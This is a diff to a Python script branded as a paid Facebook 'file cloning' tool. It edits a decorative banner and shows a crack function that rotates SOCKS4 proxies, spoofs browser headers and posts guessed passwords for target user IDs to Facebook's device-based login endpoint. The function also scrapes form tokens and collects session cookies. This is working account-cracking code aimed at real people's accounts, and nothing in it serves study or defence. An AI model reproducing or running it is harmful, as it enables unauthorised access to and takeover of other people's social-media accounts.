@@ -184,13 +184,13 @@ def banner():
 \x1b[1;96mY8888P' Y888888P Y8888P   `Y88P'     YP                                          
          \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS BIJOY BRAND\033[;0m\033[1;91m═══>\033[1;92m
 \x1b[38;5;196m╔━━━━━━━━━━━━━━━━━━━━━━━━╦━━━━━━━━━━━━━━━━━━━━━━╗
-\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐍𝐀𝐌𝐄𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;96m𓆩𝐁𝐈𝐉𝐎𝐘 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘𓆪   \x1b[38;5;196m║
-\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆩💜  \x1b[38;5;196m║ \x1b[1;96m𓆩𝐄𝐍𝐀𝐌𝐔𝐋 𝐇𝐎𝐐𝐔𝐄 𝐁𝐈𝐉𝐎𝐘𓆪          \x1b[38;5;196m║
+\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐍𝐀𝐌𝐄𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;96m𓆩𝐁𝐈𝐉𝐎𝐘 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘𓆪    \x1b[38;5;196m║
+\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆩💜       \x1b[38;5;196m║ \x1b[1;96m𓆩𝐄𝐍𝐀??𝐔𝐋 𝐇𝐎𝐐𝐔𝐄 𝐁𝐈𝐉𝐎𝐘𓆪      \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐅𝐑𝐎𝐌𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;96m𓆩𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇𓆪         \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌𓆩💜𓆪      \x1b[38;5;196m║ \x1b[1;96m𓆩𝐂𝐘𝐁𝐄𝐑 𝐗 𝐁𝐈𝐉𝐎𝐘𓆪      \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐎𝐎𝐋𝐒 𝐍𝐀𝐌𝐄𓆩💜𓆪    \x1b[38;5;196m║ \x1b[1;96m𓆩𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆𓆪       \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒𓆩💜𓆪  \x1b[38;5;196m║ \x1b[1;96m𓆩𝐏𝐀𝐈𝐃𓆪               \x1b[38;5;196m║
-\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐎𝐎𝐋𝐒 𝐕𝐄𝐑𝐒𝐈𝐎𝐍𓆩💜𓆪  \x1b[38;5;196m║ \x1b[1;96m𓆩1.2𓆪               \x1b[38;5;196m║
+\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐎𝐎𝐋𝐒 𝐕𝐄𝐑𝐒𝐈𝐎𝐍𓆩💜𓆪 \x1b[38;5;196m║ \x1b[1;96m𓆩1.2𓆪               \x1b[38;5;196m║
 \x1b[38;5;196m╚════════════════════════╩══════════════════════╝""")            
 os.system('espeak -a 100 " Your, File cloning and Addmin Contact Bijoy Chowdhury"')
 def login():
@@ -531,28 +531,28 @@ def crack(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			headers = {
-            'authority': 'play.google.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'text/plain;charset=UTF-8',
-            'origin': 'https://chromewebstore.google.com',
-            'referer': 'https://chromewebstore.google.com/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-arch': '""',
-            'sec-ch-ua-bitness': '""',
-            'sec-ch-ua-full-version': '"124.0.6327.4"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"TECNO CE7j"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-ch-ua-wow64': '?0',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'x-client-data': 'COjvygE=',
-            'x-goog-authuser': '0',}
+'authority': 'play.google.com',
+'accept': '*/*',
+'accept-language': 'en-US,en;q=0.9',
+'content-type': 'text/plain;charset=UTF-8',
+'origin': 'https://chromewebstore.google.com',
+'referer': 'https://chromewebstore.google.com/',
+'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+'sec-ch-ua-arch': '""',
+'sec-ch-ua-bitness': '""',
+'sec-ch-ua-full-version': '"124.0.6327.4"',
+'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+'sec-ch-ua-mobile': '?1',
+'sec-ch-ua-model': '"TECNO CE7j"',
+'sec-ch-ua-platform': '"Android"',
+'sec-ch-ua-platform-version': '"11.0.0"',
+'sec-ch-ua-wow64': '?0',
+'sec-fetch-dest': 'empty',
+'sec-fetch-mode': 'cors',
+'sec-fetch-site': 'same-site',
+'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+'x-client-data': 'COjvygE=',
+'x-goog-authuser': '98',}
 			p = ses.get('m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
